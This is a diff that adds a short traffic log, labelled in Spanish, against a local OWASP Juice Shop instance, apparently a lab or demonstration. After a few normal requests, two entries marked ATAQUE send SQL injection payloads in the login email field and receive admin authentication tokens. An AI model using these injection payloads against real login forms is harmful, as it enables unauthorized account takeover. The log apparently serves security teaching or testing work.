@@ -1,0 +1,11 @@
+== Tráfico contra http://localhost:3000 ==
+16:12:29  [normal] GET /                                -> HTTP 200
+      body: <!--  ~ Copyright (c) 2014-2026 Bjoern Kimminich & the OWASP Juice Shop contributors.  ~ SPDX-License-Identifier: MIT  --><!doctype html><html lang="en" data-be
+16:12:30  [normal] GET /rest/products/search?q=apple    -> HTTP 200
+      body: {"status":"success","data":[{"id":1,"name":"Apple Juice (1000ml)","description":"The all-time classic.","price":1.99,"deluxePrice":0.99,"image":"apple_juice.jpg
+16:12:31  [normal] login jim@juice-sh.op (clave mala)   -> HTTP 401
+      body: Invalid email or password.
+16:12:32  [ATAQUE] login email=' OR 1=1--               -> HTTP 200
+      body: {"authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkIjoxLCJ1c2VybmFtZSI6IiIsImVtYWlsIjoiYWRtaW5AanVpY2Utc2gub3AiLCJwYXNzd29yZCI6IjA
+16:12:33  [ATAQUE] login email=admin@juice-sh.op'--     -> HTTP 200
+      body: {"authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkIjoxLCJ1c2VybmFtZSI6IiIsImVtYWlsIjoiYWRtaW5AanVpY2Utc2gub3AiLCJwYXNzd29yZCI6IjA
